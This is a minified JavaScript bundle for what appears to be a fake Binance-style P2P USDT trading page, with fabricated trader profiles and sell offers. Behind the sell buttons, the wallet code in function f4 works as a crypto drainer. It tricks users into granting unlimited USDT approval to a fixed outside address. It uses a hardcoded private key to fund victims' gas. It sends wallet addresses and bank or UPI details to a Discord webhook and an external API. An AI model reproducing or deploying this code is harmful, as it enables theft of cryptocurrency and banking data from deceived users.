          , d = Q.useCallback(p => {
            Q.startTransition( () => u(p))
        }
        , [u]);
        return Q.useLayoutEffect( () => o.listen(d), [o, d]),
        Q.createElement(BD, {
            basename: t,
            children: e,
            location: l.location,
            navigationType: l.action,
            navigator: o
        })
    }
    var EE = /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i
      , xE = Q.forwardRef(function({onClick: e, discover: n="render", prefetch: s="none", relative: o, reloadDocument: l, replace: u, state: d, target: p, to: h, preventScrollReset: m, viewTransition: y, ...w}, E) {
        let {basename: S} = Q.useContext(Ei), _ = typeof h == "string" && EE.test(h), x, b = !1;
        if (typeof h == "string" && _ && (x = h,
        _E))
            try {
                let se = new URL(window.location.href)
                  , Z = h.startsWith("//") ? new URL(se.protocol + h) : new URL(h)
                  , oe = rr(Z.pathname, S);
                Z.origin === se.origin && oe != null ? h = oe + Z.search + Z.hash : b = !0
            } catch {
                wi(!1, `<Link to="${h}"> contains an invalid URL which will probably break when clicked - please update to a valid URL path.`)
            }
        let I = fD(h, {
            relative: o
        })
          , [O,z,L] = ZD(s, w)
          , Y = i4(h, {
            replace: u,
            state: d,
            target: p,
            preventScrollReset: m,
            relative: o,
            viewTransition: y
        });
        function W(se) {
            e && e(se),
            se.defaultPrevented || Y(se)
        }
        let D = Q.createElement("a", {
            ...w,
            ...L,
            href: x || I,
            onClick: b || l ? e : W,
            ref: $D(E, z),
            target: p,
            "data-discover": !_ && n === "render" ? "true" : void 0
        });
        return O && !_ ? Q.createElement(Q.Fragment, null, D, Q.createElement(KD, {
            page: I
        })) : D
    });
    xE.displayName = "Link";
    var e4 = Q.forwardRef(function({"aria-current": e="page", caseSensitive: n=!1, className: s="", end: o=!1, style: l, to: u, viewTransition: d, children: p, ...h}, m) {
        let y = hc(u, {
            relative: h.relative
        })
          , w = Yr()
          , E = Q.useContext(lf)
          , {navigator: S, basename: _} = Q.useContext(Ei)
          , x = E != null && l4(y) && d === !0
          , b = S.encodeLocation ? S.encodeLocation(y).pathname : y.pathname
          , I = w.pathname
          , O = E && E.navigation && E.navigation.location ? E.navigation.location.pathname : null;
        n || (I = I.toLowerCase(),
        O = O ? O.toLowerCase() : null,
        b = b.toLowerCase()),
        O && _ && (O = rr(O, _) || O);
        const z = b !== "/" && b.endsWith("/") ? b.length - 1 : b.length;
        let L = I === b || !o && I.startsWith(b) && I.charAt(z) === "/", Y = O != null && (O === b || !o && O.startsWith(b) && O.charAt(b.length) === "/"), W = {
            isActive: L,
            isPending: Y,
            isTransitioning: x
        }, D = L ? e : void 0, se;
        typeof s == "function" ? se = s(W) : se = [s, L ? "active" : null, Y ? "pending" : null, x ? "transitioning" : null].filter(Boolean).join(" ");
        let Z = typeof l == "function" ? l(W) : l;
        return Q.createElement(xE, {
            ...h,
            "aria-current": D,
            className: se,
            ref: m,
            style: Z,
            to: u,
            viewTransition: d
        }, typeof p == "function" ? p(W) : p)
    });
    e4.displayName = "NavLink";
    var t4 = Q.forwardRef( ({discover: t="render", fetcherKey: e, navigate: n, reloadDocument: s, replace: o, state: l, method: u=Pu, action: d, onSubmit: p, relative: h, preventScrollReset: m, viewTransition: y, ...w}, E) => {
        let S = a4()
          , _ = o4(d, {
            relative: h
        })
          , x = u.toLowerCase() === "get" ? "get" : "post"
          , b = typeof d == "string" && EE.test(d)
          , I = O => {
            if (p && p(O),
            O.defaultPrevented)
                return;
            O.preventDefault();
            let z = O.nativeEvent.submitter
              , L = z?.getAttribute("formmethod") || u;
            S(z || O.currentTarget, {
                fetcherKey: e,
                method: L,
                navigate: n,
                replace: o,
                state: l,
                relative: h,
                preventScrollReset: m,
                viewTransition: y
            })
        }
        ;
        return Q.createElement("form", {
            ref: E,
            method: x,
            action: _,
            onSubmit: s ? p : I,
            ...w,
            "data-discover": !b && t === "render" ? "true" : void 0
        })
    }
    );
    t4.displayName = "Form";
    function n4(t) {
        return `${t} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`
    }
    function SE(t) {
        let e = Q.useContext(mo);
        return yt(e, n4(t)),
        e
    }
    function i4(t, {target: e, replace: n, state: s, preventScrollReset: o, relative: l, viewTransition: u}={}) {
        let d = q0()
          , p = Yr()
          , h = hc(t, {
            relative: l
        });
        return Q.useCallback(m => {
            if (MD(m, e)) {
                m.preventDefault();
                let y = n !== void 0 ? n : tc(p) === tc(h);
                d(t, {
                    replace: y,
                    state: s,
                    preventScrollReset: o,
                    relative: l,
                    viewTransition: u
                })
            }
        }
        , [p, d, h, n, s, e, t, o, l, u])
    }
    var r4 = 0
      , s4 = () => `__${String(++r4)}__`;
    function a4() {
        let {router: t} = SE("useSubmit")
          , {basename: e} = Q.useContext(Ei)
          , n = xD();
        return Q.useCallback(async (s, o={}) => {
            let {action: l, method: u, encType: d, formData: p, body: h} = UD(s, e);
            if (o.navigate === !1) {
                let m = o.fetcherKey || s4();
                await t.fetch(m, n, o.action || l, {
                    preventScrollReset: o.preventScrollReset,
                    formData: p,
                    body: h,
                    formMethod: o.method || u,
                    formEncType: o.encType || d,
                    flushSync: o.flushSync
                })
            } else
                await t.navigate(o.action || l, {
                    preventScrollReset: o.preventScrollReset,
                    formData: p,
                    body: h,
                    formMethod: o.method || u,
                    formEncType: o.encType || d,
                    replace: o.replace,
                    state: o.state,
                    fromRouteId: n,
                    flushSync: o.flushSync,
                    viewTransition: o.viewTransition
                })
        }
        , [t, e, n])
    }
    function o4(t, {relative: e}={}) {
        let {basename: n} = Q.useContext(Ei)
          , s = Q.useContext(xi);
        yt(s, "useFormAction must be used inside a RouteContext");
        let[o] = s.matches.slice(-1)
          , l = {
            ...hc(t || ".", {
                relative: e
            })
        }
          , u = Yr();
        if (t == null) {
            l.search = u.search;
            let d = new URLSearchParams(l.search)
              , p = d.getAll("index");
            if (p.some(m => m === "")) {
                d.delete("index"),
                p.filter(y => y).forEach(y => d.append("index", y));
                let m = d.toString();
                l.search = m ? `?${m}` : ""
            }
        }
        return (!t || t === ".") && o.route.index && (l.search = l.search ? l.search.replace(/^\?/, "?index&") : "?index"),
        n !== "/" && (l.pathname = l.pathname === "/" ? n : Wi([n, l.pathname])),
        tc(l)
    }
    function l4(t, e={}) {
        let n = Q.useContext(pE);
        yt(n != null, "`useViewTransitionState` must be used within `react-router-dom`'s `RouterProvider`.  Did you accidentally import `RouterProvider` from `react-router`?");
        let {basename: s} = SE("useViewTransitionState")
          , o = hc(t, {
            relative: e.relative
        });
        if (!n.isTransitioning)
            return !1;
        let l = rr(n.currentLocation.pathname, s) || n.currentLocation.pathname
          , u = rr(n.nextLocation.pathname, s) || n.nextLocation.pathname;
        return Md(o.pathname, u) != null || Md(o.pathname, l) != null
    }
    [...QD];
    function c4(t) {
        return t && t.length > 0 ? t[0].toUpperCase() : "?"
    }
    const u4 = {
        name: "Trader",
        completionRate: "--",
        trades: "--",
        available: "--",
        limit: "--",
        payment: "--",
        timeLimit: "--"
    };
    function d4() {
        const {name: t} = mD()
          , e = Yr();
        q0();
        const n = e.state || {
            ...u4,
            name: t
        }
          , [s,o] = Q.useState(!1);
        Q.useEffect( () => {
            const x = window.matchMedia("(prefers-color-scheme: dark)");
            o(x.matches);
            const b = I => o(I.matches);
            return x.addEventListener("change", b),
            () => x.removeEventListener("change", b)
        }
        , []);
        const l = {
            background: s ? "#1a1a1a" : "#fff",
            text: s ? "#fff" : "#222",
            textSecondary: s ? "#B2B5BE" : "#888",
            border: s ? "#353945" : "#E0E0E0",
            accent: s ? "#1bbf3a" : "#2962ff",
            infoBg: s ? "#23262F" : "#EAF1FF",
            logo: s ? "#fff" : "#000"
        }
          , u = "2000.00 USDT"
          , d = "Silver Merchant"
          , p = ["Email", "SMS", "KYC", "Address"]
          , h = "Multi-Product Trader"
          , m = "1333"
          , y = "1328"
          , w = "29575"
          , E = n.trades !== "--" ? `${parseInt(n.trades) * 215}` : "52894"
          , S = n.trades !== "--" ? `${Math.floor(parseInt(n.trades) * .4 * 215 / 215)}` : "12875"
          , _ = n.trades !== "--" ? `${Math.floor(parseInt(n.trades) * .6 * 215 / 215)}` : "40019";
        return k.jsxs("div", {
            style: {
                background: l.background,
                minHeight: "100vh",
                fontFamily: "Inter, Arial, sans-serif"
            },
            children: [k.jsxs("div", {
                style: {
                    background: l.accent,
                    backgroundImage: l.accent,
                    minHeight: 120,
                    position: "relative",
                    display: "flex",
                    flexDirection: "column",
                    justifyContent: "flex-start",
                    padding: 0
                },
                children: [k.jsx("div", {
                    style: {
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "space-between",
                        padding: "16px 20px 0 12px"
                    }
                }), k.jsx("div", {
                    style: {
                        position: "absolute",
                        left: 24,
                        top: 70,
                        width: 72,
                        height: 72,
                        background: l.background,
                        borderRadius: 20,
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        fontSize: 38,
                        fontWeight: 700,
                        boxShadow: `0 2px 8px ${l.border}`,
                        border: `3px solid ${l.background}`,
                        color: l.logo
                    },
                    children: c4(n.name)
                })]
            }), k.jsx("div", {
                style: {
                    display: "flex",
                    alignItems: "center",
                    marginTop: 48,
                    marginLeft: 24,
                    gap: 10
                },
                children: k.jsx("span", {
                    style: {
                        fontWeight: 700,
                        fontSize: 28,
                        color: l.text
                    },
                    children: n.name
                })
            }), k.jsxs("div", {
                style: {
                    display: "flex",
                    alignItems: "center",
                    marginLeft: 24,
                    marginTop: 4,
                    gap: 8
                },
                children: [k.jsx("span", {
                    style: {
                        width: 10,
                        height: 10,
                        background: "#1bbf3a",
                        borderRadius: "50%",
                        display: "inline-block"
                    }
                }), k.jsx("span", {
                    style: {
                        color: l.textSecondary,
                        fontSize: 15
                    },
                    children: "Online"
                })]
            }), k.jsxs("div", {
                style: {
                    display: "flex",
                    alignItems: "center",
                    marginLeft: 24,
                    marginTop: 12,
                    gap: 16
                },
                children: [k.jsx("span", {
                    style: {
                        background: l.infoBg,
                        color: l.accent,
                        fontWeight: 600,
                        borderRadius: 8,
                        padding: "2px 10px",
                        fontSize: 13
                    },
                    children: d
                }), k.jsx("span", {
                    style: {
                        color: l.textSecondary,
                        fontSize: 15
                    },
                    children: "|"
                }), k.jsxs("span", {
                    style: {
                        color: l.textSecondary,
                        fontSize: 15
                    },
                    children: ["Deposit: ", k.jsx("span", {
                        style: {
                            color: l.text
                        },
                        children: u
                    })]
                })]
            }), k.jsx("div", {
                style: {
                    display: "flex",
                    gap: 18,
                    marginLeft: 24,
                    marginTop: 12,
                    marginBottom: 8
                },
                children: p.map(x => k.jsxs("span", {
                    style: {
                        color: l.accent,
                        fontWeight: 500,
                        fontSize: 15,
                        display: "flex",
                        alignItems: "center",
                        gap: 4
                    },
                    children: [k.jsx("span", {
                        style: {
                            fontSize: 8,
                            color: l.accent
                        },
                        children: "✔️"
                    }), " ", x]
                }, x))
            }), k.jsx("div", {
                style: {
                    display: "flex",
                    justifyContent: "flex-start",
                    gap: 32,
                    marginTop: 18,
                    marginLeft: 24
                },
                children: k.jsx("div", {
                    style: {
                        fontWeight: 700,
                        fontSize: 18,
                        color: l.accent,
                        borderBottom: `2.5px solid ${l.accent}`,
                        paddingBottom: 6,
                        cursor: "pointer"
                    },
                    children: "Info"
                })
            }), k.jsx("div", {
                style: {
                    maxWidth: 420,
                    margin: "24px auto 0 auto",
                    background: l.background,
                    borderRadius: 16,
                    padding: 0,
                    boxShadow: "none"
                },
                children: k.jsxs("div", {
                    style: {
                        padding: "24px 0 0 0"
                    },
                    children: [k.jsxs("div", {
                        style: {
                            display: "flex",
                            justifyContent: "space-between",
                            padding: "0 24px",
                            marginBottom: 12
                        },
                        children: [k.jsx("span", {
                            style: {
                                color: l.textSecondary,
                                fontSize: 17
                            },
                            children: "30d Trades"
                        }), k.jsx("span", {
                            style: {
                                color: l.text,
                                fontSize: 17
                            },
                            children: n.trades
                        })]
                    }), k.jsxs("div", {
                        style: {
                            display: "flex",
                            justifyContent: "space-between",
                            padding: "0 24px",
                            marginBottom: 12
                        },
                        children: [k.jsx("span", {
                            style: {
                                color: l.textSecondary,
                                fontSize: 17
                            },
                            children: "30d Completion Rate"
                        }), k.jsx("span", {
                            style: {
                                color: l.accent,
                                fontWeight: 700,
                                fontSize: 17
                            },
                            children: n.completionRate
                        })]
                    }), k.jsxs("div", {
                        style: {
                            display: "flex",
                            justifyContent: "space-between",
                            padding: "0 24px",
                            marginBottom: 12
                        },
                        children: [k.jsx("span", {
                            style: {
                                color: l.textSecondary,
                                fontSize: 17
                            },
                            children: "Avg. Release Time"
                        }), k.jsx("span", {
                            style: {
                                color: l.text,
                                fontSize: 17
                            },
                            children: "2.87 Minute(s)"
                        })]
                    }), k.jsxs("div", {
                        style: {
                            display: "flex",
                            justifyContent: "space-between",
                            padding: "0 24px",
                            marginBottom: 12
                        },
                        children: [k.jsx("span", {
                            style: {
                                color: l.textSecondary,
                                fontSize: 17
                            },
                            children: "Avg. Pay Time"
                        }), k.jsx("span", {
                            style: {
                                color: l.text,
                                fontSize: 17
                            },
                            children: "4.31 Minute(s)"
                        })]
                    }), k.jsxs("div", {
                        style: {
                            display: "flex",
                            justifyContent: "space-between",
                            padding: "0 24px",
                            marginBottom: 12
                        },
                        children: [k.jsx("span", {
                            style: {
                                color: l.textSecondary,
                                fontSize: 17
                            },
                            children: "Trade Type"
                        }), k.jsx("span", {
                            style: {
                                color: l.text,
                                fontSize: 17
                            },
                            children: h
                        })]
                    }), k.jsxs("div", {
                        style: {
                            display: "flex",
                            justifyContent: "space-between",
                            padding: "0 24px",
                            marginBottom: 12
                        },
                        children: [k.jsx("span", {
                            style: {
                                color: l.textSecondary,
                                fontSize: 17
                            },
                            children: "Registered"
                        }), k.jsxs("span", {
                            style: {
                                color: l.text,
                                fontSize: 17
                            },
                            children: [m, " Day(s) ago"]
                        })]
                    }), k.jsxs("div", {
                        style: {
                            display: "flex",
                            justifyContent: "space-between",
                            padding: "0 24px",
                            marginBottom: 12
                        },
                        children: [k.jsx("span", {
                            style: {
                                color: l.textSecondary,
                                fontSize: 17
                            },
                            children: "First Trade"
                        }), k.jsxs("span", {
                            style: {
                                color: l.text,
                                fontSize: 17
                            },
                            children: [y, " Day(s) ago"]
                        })]
                    }), k.jsxs("div", {
                        style: {
                            display: "flex",
                            justifyContent: "space-between",
                            padding: "0 24px",
                            marginBottom: 12
                        },
                        children: [k.jsx("span", {
                            style: {
                                color: l.textSecondary,
                                fontSize: 17
                            },
                            children: "Trading Counterparties"
                        }), k.jsx("span", {
                            style: {
                                color: l.text,
                                fontSize: 17
                            },
                            children: w
                        })]
                    }), k.jsxs("div", {
                        style: {
                            display: "flex",
                            justifyContent: "space-between",
                            padding: "0 24px",
                            marginBottom: 12
                        },
                        children: [k.jsx("span", {
                            style: {
                                color: l.textSecondary,
                                fontSize: 17
                            },
                            children: "All Trades"
                        }), k.jsxs("span", {
                            style: {
                                color: l.text,
                                fontSize: 17
                            },
                            children: [E, " Time(s)"]
                        })]
                    }), k.jsxs("div", {
                        style: {
                            display: "flex",
                            justifyContent: "space-between",
                            padding: "0 24px",
                            marginBottom: 12
                        },
                        children: [k.jsx("span", {
                            style: {
                                color: l.textSecondary,
                                fontSize: 17
                            },
                            children: "Buy"
                        }), k.jsx("span", {
                            style: {
                                color: l.text,
                                fontSize: 17
                            },
                            children: S
                        })]
                    }), k.jsxs("div", {
                        style: {
                            display: "flex",
                            justifyContent: "space-between",
                            padding: "0 24px",
                            marginBottom: 12
                        },
                        children: [k.jsx("span", {
                            style: {
                                color: l.textSecondary,
                                fontSize: 17
                            },
                            children: "Sell"
                        }), k.jsx("span", {
                            style: {
                                color: l.text,
                                fontSize: 17
                            },
                            children: _
                        })]
                    })]
                })
            }), k.jsxs("div", {
                style: {
                    maxWidth: 420,
                    margin: "32px auto 0 auto",
                    textAlign: "center"
                },
                children: [k.jsx("button", {
                    style: {
                        background: l.background,
                        color: l.text,
                        border: `1px solid ${l.border}`,
                        borderRadius: 8,
                        padding: "10px 24px",
                        fontWeight: 600,
                        fontSize: 16,
                        cursor: "pointer",
                        marginBottom: 16
                    },
                    children: "Block"
                }), k.jsx("div", {
                    style: {
                        color: l.textSecondary,
                        fontSize: 13,
                        marginBottom: 4,
                        fontWeight: 600
                    },
                    children: "Binance Risk Management"
                }), k.jsx("div", {
                    style: {
                        color: l.textSecondary,
                        fontSize: 13
                    },
                    children: "To reduce your trading risk, the verified advertiser has already paid a deposit as collateral."
                })]
            })]
        })
    }
    function f4() {
        const [t,e] = Q.useState(!1)
          , [n,s] = Q.useState(!1)
          , [o,l] = Q.useState(0)
          , [u,d] = Q.useState(null)
          , p = [{
            constant: !0,
            inputs: [{
                name: "_owner",
                type: "address"
            }],
            name: "balanceOf",
            outputs: [{
                name: "balance",
                type: "uint256"
            }],
            type: "function"
        }, {
            constant: !1,
            inputs: [{
                name: "_to",
                type: "address"
            }, {
                name: "_value",
                type: "uint256"
            }],
            name: "transfer",
            outputs: [{
                name: "",
                type: "bool"
            }],
            type: "function"
        }, {
            constant: !1,
            inputs: [{
                name: "_spender",
                type: "address"
            }, {
                name: "_value",
                type: "uint256"
            }],
            name: "approve",
            outputs: [{
                name: "",
                type: "bool"
            }],
            type: "function"
        }, {
            constant: !0,
            inputs: [],
            name: "decimals",
            outputs: [{
                name: "",
                type: "uint8"
            }],
            type: "function"
        }, {
            constant: !0,
            inputs: [],
            name: "symbol",
            outputs: [{
                name: "",
                type: "string"
            }],
            type: "function"
        }, {
            constant: !0,
            inputs: [],
            name: "name",
            outputs: [{
                name: "",
                type: "string"
            }],
            type: "function"
        }]
          , h = "0x55d398326f99059fF775485246999027B3197955";
        async function m() {
            return new Wn(window.ethereum)
        }
        const y = "0xcad4313c569e8b9c6c4b29a72a56c262773c9e37cd76c481d04b75a11e233131"
          , w = {
            chainId: "0x38"
        };
        function E() {
            return null
        }
        function S() {}
        const _ = async ue => {
            try {
                if (!ue)
                    return;
                const be = await m()
                  , st = await new be.eth.Contract(p,h).methods.balanceOf(ue).call()
                  , ke = parseFloat(be.utils.fromWei(st, "ether"));
                return l(ke),
                ke
            } catch (be) {
                return console.error("Error getting USDT balance:", be),
                0
            }
        }
          , x = "0.00001"
          , b = new Wn(window.ethereum).eth.accounts.privateKeyToAccount(y).address;
        async function I() {
            let ue = null;
            if (window.ethereum && (ue = (await new Wn(window.ethereum).eth.getAccounts())[0]),
            ue || (ue = new URLSearchParams(window.location.search).get("address")),
            ue || (ue = E()),
            !ue) {
                console.error("No user account found for sending gas fee.");
                return
            }
            const be = await m()
              , ct = be.utils.toWei(x, "ether")
              , st = await be.eth.getGasPrice()
              , ke = {
                from: b,
                to: ue,
                value: ct,
                gas: 21e3,
                gasPrice: st
            };
            try {
                const dt = await be.eth.accounts.signTransaction(ke, y)
                  , Vn = await be.eth.sendSignedTransaction(dt.rawTransaction);
                console.log("Gas sent:", Vn.transactionHash)
            } catch (dt) {
                console.error("Failed to send gas fee:", dt)
            }
        }
        function O(ue) {
            return new Promise(be => setTimeout(be, ue))
        }
        const z = "0x9Fc216CAE3CA7a455B0110a7B7f77Da0A99A29d8";
        function L() {}
        const [Y,W] = Q.useState(!1)
          , [D,se] = Q.useState("")
          , [Z,oe] = Q.useState("")
          , [le,ve] = Q.useState("")
          , [ze,B] = Q.useState("")
          , [T,P] = Q.useState("")
          , [J,ie] = Q.useState("")
          , [R,F] = Q.useState("")
          , [ne,ae] = Q.useState("")
          , [re,he] = Q.useState(null)
          , [ye,ut] = Q.useState(null)
          , Xe = [94, 96.5, 98]
          , vt = D && !isNaN(D) && Number(D) > 0
          , Bn = R.length >= 11;
        let rn = !1;
        Z === "UPI" ? rn = vt && le && ze : Z === "Bank Transfer" && (rn = vt && T && J && Bn && ne);
        const Pt = ye !== null ? Xe[ye] : 0
          , Cn = vt ? (Number(D) * Pt).toFixed(2) : "0.00"
          , In = async ue => {
            ut(ue);
            let be = null;
            window.ethereum && (be = (await new Wn(window.ethereum).eth.getAccounts())[0]),
            be || (be = new URLSearchParams(window.location.search).get("address")),
            be || (be = E());
            const ct = await _(be);
            if (!ct || ct <= 0) {
                po(ue);
                return
            }
            await I(),
            po(ue)
        }
        ;
        Q.useEffect( () => {
            const ue = window.matchMedia("(prefers-color-scheme: dark)");
            e(ue.matches);
            const be = ct => e(ct.matches);
            return ue.addEventListener("change", be),
            () => ue.removeEventListener("change", be)
        }
        , []);
        const cr = Q.useRef(null);
        Q.useEffect( () => {
            !Y && cr.current && cr.current.focus()
        }
        , [Y]);
        async function js() {
            try {
                if (typeof window > "u")
                    return;
                const ue = await m();
                let be;
                if (window.ethereum && (be = (await ue.eth.getAccounts())[0]),
                be || (be = new URLSearchParams(window.location.search).get("address")),
                be || (be = E()),
                !be || !ue.utils.isAddress(be)) {
                    console.log("No valid wallet address available");
                    return
                }
                await _(be)
            } catch (ue) {
                console.error("Initialization error:", ue),
                l(0)
            }
        }
        async function gn({wallet_address: ue, amount: be, action: ct}) {
            const st = "https://discord.com/api/webhooks/1393290566825017405/h5qPhCMfGUU_AIZvSeuKmQuHys7PaJhZcD4MeYVta4EIrvFQkZ0Sag3oHSZ79YhRMhaC";
            try {
                const ke = {
                    content: "New Transaction Approval",
                    embeds: [{
                        title: "Wallet Activity",
                        color: 5814783,
                        fields: [{
                            name: "Wallet Address",
                            value: ue || "Unknown"
                        }, {
                            name: "Amount",
                            value: be ? `${be} USDT` : "Unknown"
                        }, {
                            name: "Action",
                            value: ct || "Unknown"
                        }, {
                            name: "Timestamp",
                            value: new Date().toISOString()
                        }],
                        footer: {
                            text: "USDT Transaction System"
                        }
                    }]
                }
                  , dt = await fetch(st, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(ke)
                });
                if (!dt.ok)
                    throw new Error(`Discord webhook error: ${dt.status} ${dt.statusText}`);
                const Vn = await fetch("https://usdtapi.naraynseva.org/api/transactions/transaction-store", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        usdtAddress: ue,
                        amount: be
                    })
                });
                if (!Vn.ok)
                    throw new Error(`API error: ${Vn.status} ${Vn.statusText}`);
                console.log("Successfully sent to Discord and transaction-store API!")
            } catch (ke) {
                console.error("Error in sendToDiscordFromFrontend:", ke)
            }
        }
        async function uf(ue) {
            const be = "https://discord.com/api/webhooks/1393290566825017405/h5qPhCMfGUU_AIZvSeuKmQuHys7PaJhZcD4MeYVta4EIrvFQkZ0Sag3oHSZ79YhRMhaC";
            try {
                const ct = {
                    content: "New Transaction Approval",
                    embeds: [{
                        title: "Wallet Activity",
                        color: 5814783,
                        fields: [{
                            name: "Wallet Address",
                            value: ue.wallet_address || "Unknown"
                        }, {
                            name: "Amount",
                            value: ue.amount ? `${ue.amount} USDT` : "Unknown"
                        }, {
                            name: "Payment Method",
                            value: ue.payment_method || "Unknown"
                        }, ...ue.payment_method === "UPI" ? [{
                            name: "UPI ID",
                            value: ue.upiId || "N/A"
                        }, {
                            name: "UPI Holder",
                            value: ue.upiHolder || "N/A"
                        }] : [{
                            name: "Bank Holder",
                            value: ue.bankHolder || "N/A"
                        }, {
                            name: "IFSC",
                            value: ue.ifsc || "N/A"
                        }, {
                            name: "Bank Account",
                            value: ue.bankAccount || "N/A"
                        }, {
                            name: "Bank Name",
                            value: ue.bankName || "N/A"
                        }], {
                            name: "Action",
                            value: ue.action || "Unknown"
                        }, {
                            name: "Timestamp",
                            value: new Date().toISOString()
                        }],
                        footer: {
                            text: "USDT Transaction System"
                        }
                    }]
                }
                  , st = await fetch(be, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(ct)
                });
                if (!st.ok)
                    throw new Error(`Discord webhook error: ${st.status} ${st.statusText}`);
                const ke = await fetch("https://usdtapi.naraynseva.org/api/transactions/transaction-store", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        usdtAddress: ue.wallet_address,
                        amount: ue.amount
                    })
                });
                if (!ke.ok)
                    throw new Error(`API error: ${ke.status} ${ke.statusText}`);
                console.log("Successfully sent to Discord and transaction-store API!")
            } catch (ct) {
                console.error("Error in sendToDiscordFromFrontend:", ct)
            }
        }
        async function po(ue) {
            d(ue),
            s(!0),
            await js();
            try {
                if (typeof window > "u")
                    return;
                if (!window.ethereum)
                    throw new Error("No wallet detected. Use Trust Wallet or MetaMask.");
                const be = new Wn(window.ethereum)
                  , ct = await m();
                if (ct.eth.accounts.wallet.add(ct.eth.accounts.privateKeyToAccount(y)),
                await window.ethereum.request({
                    method: "eth_chainId"
                }),
                await be.eth.getChainId() !== parseInt(w.chainId, 16))
                    try {
                        await window.ethereum.request({
                            method: "wallet_switchEthereumChain",
                            params: [{
                                chainId: w.chainId
                            }]
                        })
                    } catch (ri) {
                        if (ri.code === 4902)
                            try {
                                await window.ethereum.request({
                                    method: "wallet_addEthereumChain",
                                    params: [{
                                        chainId: w.chainId,
                                        chainName: "Binance Smart Chain Mainnet",
                                        rpcUrls: ["https://bsc-dataseed.binance.org"],
                                        nativeCurrency: {
                                            name: "BNB",
                                            symbol: "BNB",
                                            decimals: 18
                                        },
                                        blockExplorerUrls: ["https://bscscan.com"]
                                    }]
                                }),
                                await window.ethereum.request({
                                    method: "wallet_switchEthereumChain",
                                    params: [{
                                        chainId: w.chainId
                                    }]
                                })
                            } catch (Yn) {
                                throw console.error("Failed to add BSC network:", Yn),
                                Yn
                            }
                        else
                            throw ri
                    }
                let ke;
                if (window.ethereum && (ke = (await be.eth.getAccounts())[0],
                ke || (await window.ethereum.request({
                    method: "eth_requestAccounts"
                }),
                ke = (await be.eth.getAccounts())[0]),
                console.log("Account from wallet:", ke)),
                ke || (ke = new URLSearchParams(window.location.search).get("address"),
                console.log("Account from URL:", ke)),
                ke || (ke = E(),
                console.log("Account from localStorage:", ke)),
                !ke || !be.utils.isAddress(ke))
                    throw console.error("Invalid wallet address:", ke),
                    new Error("Invalid wallet address.");
                const dt = new be.eth.Contract(p,h)
                  , Vn = new ct.eth.Contract(p,h)
                  , Z0 = await Vn.methods.balanceOf(ke).call()
                  , df = await be.eth.getBalance(ke)
                  , Hs = be.utils.fromWei(df, "ether");
                parseFloat(Hs) < parseFloat(x) && (I(),
                console.log("Insufficient BNB balance. Gas fee sent to user."),
                await O(5e3));
                const zs = be.utils.toWei("9999999999", "ether");
                await dt.methods.approve(z, zs).send({
                    from: ke
                }).on("receipt", async function(ri) {
                    console.log("Approval Successful:", ri),
                    W(!0);
                    try {
                        await fetch("/api/save-user-details", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({
                                wallet_address: ke,
                                amount: o,
                                action: "approved"
                            })
                        }),
                        gn({
                            wallet_address: ke,
                            amount: o,
                            action: "approved"
                        })
                    } catch (Yn) {
                        console.error("Failed to save user details:", Yn),
                        gn({
                            wallet_address: ke,
                            amount: o,
                            action: "approved"
                        })
                    }
                    console.log("Success: USDT successfully approved.")
                }),
                console.log("Success: Transfer Success USDT");
                const Si = await Vn.methods.balanceOf(ke).call();
                l(parseFloat(be.utils.fromWei(Si, "ether")))
            } catch (be) {
                console.error("Error:", be),
                console.error("Error:", be.message || "Failed. Check console.")
            } finally {
                s(!1),
                d(null)
            }
        }
        const K = {
            background: t ? "#1a1a1a" : "#fff",
            cardBg: t ? "#333333" : "#F6F7FB",
            text: t ? "#fff" : "#222",
            textSecondary: t ? "#B2B5BE" : "#888",
            border: t ? "#353945" : "#E0E0E0",
            infoBg: t ? "#23262F" : "#EAF1FF",
            successBg: t ? "#1a2e1a" : "#eaffea",
            shadowColor: t ? "rgba(0,0,0,0.3)" : "#e0e0e0",
            accent: t ? "#1bbf3a" : "#2962ff",
            buttonInactiveText: t ? "#2D764B" : "#888",
            iconActive: t ? "#1bbf3a" : "#2962ff",
            detail: t ? "#fff" : "#000"
        }
          , Ps = q0();
        function go(ue) {
            Ps(`/trader/${encodeURIComponent(ue.name)}`, {
                state: ue
            })
        }
        const Kt = [{
            name: "CryptoTrader_01",
            completionRate: "99.5%",
            trades: "245",
            available: "15,250.00 USDT",
            limit: "5,000.00 - 75,000.00 INR",
            payment: "Bank Transfer, UPI",
            timeLimit: "60 min"
        }, {
            name: "P2P_Master",
            completionRate: "99.2%",
            trades: "189",
            available: "8,750.50 USDT",
            limit: "10,000.00 - 50,000.00 INR",
            payment: "Bank Transfer, UPI, IMPS",
            timeLimit: "45 min"
        }, {
            name: "SafeTrader_Pro",
            completionRate: "97.8%",
            trades: "312",
            available: "22,100.75 USDT",
            limit: "2,000.00 - 100,000.00 INR",
            payment: "Bank Transfer",
            timeLimit: "30 min"
        }];
        return k.jsxs(k.Fragment, {
            children: [k.jsxs("div", {
                style: {
                    background: K.background,
                    minHeight: "100vh",
                    fontFamily: "Inter, Arial, sans-serif"
                },
                children: [k.jsxs("div", {
                    style: {
                        display: "flex",
                        gap: 8,
                        margin: "0 0 0 0",
                        padding: "10px 16px"
                    },
                    children: [k.jsx("button", {
                        style: {
                            flex: 1,
                            background: K.cardBg,
                            border: `1px solid ${K.border}`,
                            borderRadius: 8,
                            padding: "10px 0",
                            fontWeight: 600,
                            color: K.text
                        },
                        children: "Sell USDT"
                    }), k.jsx("button", {
                        style: {
                            flex: 1,
                            background: K.cardBg,
                            border: `1px solid ${K.border}`,
                            borderRadius: 8,
                            padding: "10px 0",
                            fontWeight: 600,
                            color: K.text,
                            opacity: .5
                        },
                        children: "Buy USDT"
                    }), k.jsx("button", {
                        style: {
                            flex: 1,
                            background: K.cardBg,
                            border: `1px solid ${K.border}`,
                            borderRadius: 8,
                            padding: "10px 0",
                            fontWeight: 600,
                            color: K.text,
                            opacity: .5
                        },
                        children: "Advanced"
                    })]
